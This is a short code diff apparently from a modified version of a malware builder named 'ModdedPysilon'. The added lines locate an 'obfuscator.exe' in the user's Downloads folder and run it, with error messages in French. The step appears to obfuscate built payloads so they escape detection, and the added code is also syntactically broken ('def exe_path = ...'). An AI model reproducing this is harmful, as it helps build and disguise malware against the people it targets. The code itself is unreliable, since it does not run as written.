@@ -61,7 +61,17 @@ default_modules = [
     'import os\n',
 ]
 
+def exe_path = os.path.join(os.environ["USERPROFILE"], r"Downloads\ModdedPysilon\ModdedPysilon\resources\obfuscator.exe")
 
+if not os.path.isfile(exe_path):
+    print(f"Erreur : l'obufuscateur {exe_path} n'existe pas. Le programme va s'arrêter.")
+    sys.exit(1) 
+try:
+    subprocess.run([exe_path], check=True)
+except subprocess.CalledProcessError as e:
+    print(f"Une erreur est survenue lors de l'exécution de l'obfuscation : {e}")
+    sys.exit(1)  
+    
 def get_file_path(file_types):
     root2 = Tk()
     root2.withdraw()
